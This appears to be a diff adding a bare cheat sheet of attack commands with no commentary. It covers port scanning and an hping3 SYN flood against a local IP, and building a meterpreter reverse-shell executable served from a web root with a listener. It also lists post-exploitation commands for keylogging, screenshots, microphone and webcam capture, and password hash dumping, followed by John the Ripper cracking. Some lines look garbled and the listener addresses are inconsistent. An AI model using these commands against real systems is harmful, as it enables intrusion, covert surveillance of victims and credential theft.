@@ -1,0 +1,45 @@
+nmap -p- -sV 192.168.1.1
+nmap -p 80 192.168.1.1
+sudo hping3 -c 10000 -d 120 -S -w 64 -p 80 -S --flood 192.168.1.1
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.138 LPORT=7777 -f exe > run.exe
+sudo cp run.exe /var/www/html/
+
+sudo service apache2 restart
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.238
+set LPORT 7777
+exploit
+sessions -i 1
+
+arp
+upload
+download
+sysinfo
+play /root/downloads/hacked.wav
+keyboard_send ziead
+keyscan_start
+keyscan_dump
+mouse click
+mouse rightclick
+mouse move 1 1
+screenshot
+screenshar
+record_mic
+webcam_chat
+webcam_snap
+webcam_stream
+hashdump
+
+sudo lsof -i :7777
+sudo kill -9 319315
+
+rm -rf /root/.john
+nano /usr/share/john/password.lst
+echo %&%hash&%^&^ > cr
+john --format=NT cr
+
+
+
